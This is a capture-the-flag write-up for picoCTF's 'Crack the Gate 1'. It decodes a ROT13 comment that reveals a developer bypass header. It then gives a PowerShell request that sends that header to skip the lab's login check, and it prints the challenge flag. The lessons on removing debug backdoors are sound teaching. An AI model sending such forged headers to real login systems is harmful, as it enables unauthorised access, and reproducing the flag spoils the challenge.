# 🔓 Crack the Gate 1 — Writeup

## 📋 What's the Challenge?

You're given a **login page**. You need to get in. But instead of guessing the password, you find a **secret shortcut** hidden in the code. 🕵️

---

## 🎯 What You're Working With

| **Item** | **Value** |
| :--- | :--- |
| 📧 Email | `ctf-player@picoctf.org` |
| 🌐 Endpoint | `POST /login` |
| 🧩 Difficulty | Easy (Beginner) |

---

## 👀 Step 1: Look at the Page Source

Open the page in your browser → **Right-click** → **View Page Source**.

You'll find a hidden comment that looks like nonsense:

```text
ABGR: Wnpx - grzcbenel olcnff: hfr urnqre K-Qri-Npprff: lrf

🤔 "What is this?? Random letters?"

Nope! It's a code.

🔑 Step 2: Decode the Secret Message

This is ROT13 — a simple substitution cipher where every letter is shifted 13 positions in the alphabet.

A → N
B → O
C → P
D → Q
...
N → A
O → B
P → C

So, swapping each letter by 13 positions gives:

📝 NOTE: Jack — temporary bypass: use header X-Dev-Access: yes

🚪 Step 3: What Does This Mean?

Imagine a building with:

🚪 Front door → needs a key (password)
🚪 Back door → open to anyone who says the magic word

Jack, the developer, accidentally left the back door open in the code.

The magic word is this HTTP header:

X-Dev-Access: yes

If you include this header in your request, the server accepts the request without requiring the correct password.

💥 Step 4: Exploit It with PowerShell
$response = Invoke-WebRequest -Uri "http://amiable-citadel.picoctf.net:61372/login" `
  -Method POST `
  -Headers @{ "X-Dev-Access" = "yes" } `
  -Body "email=ctf-player@picoctf.org&password=test" `
  -ContentType "application/x-www-form-urlencoded"

$response.Content

🎉 The flag appears in the response. You didn't need the real password!

🏆 Flag
picoCTF{brut4_f0rc4_0d39383f}
🧠 What Did We Learn?
✅ Good Practice	❌ What Went Wrong
Remove debug code before going live	Left a backdoor in production
Never trust user-controlled headers	Trusted X-Dev-Access blindly
Don't hide secrets in comments	Encoded a secret in plain sight

💡 Real-world lesson: Encoding a secret doesn't make it secure. Anyone who can view the source can decode it. Remove debug code and development bypasses before deploying to production. 🚫🔑
